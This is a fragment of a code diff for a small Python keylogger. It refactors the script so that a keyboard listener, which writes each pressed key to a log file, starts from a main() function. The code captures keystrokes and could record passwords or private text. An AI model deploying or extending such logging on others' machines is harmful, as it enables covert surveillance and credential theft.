@@ -8,8 +8,10 @@ def keyPressed(key):
             logKey.write(char)
         except:
             print("Error getting char")
-
-if __name__ == "__main__":
+def main():
     listener = keyboard.Listener(on_press=keyPressed)
     listener.start()
     input()
+    
+if __name__ == "__main__":
+    main()
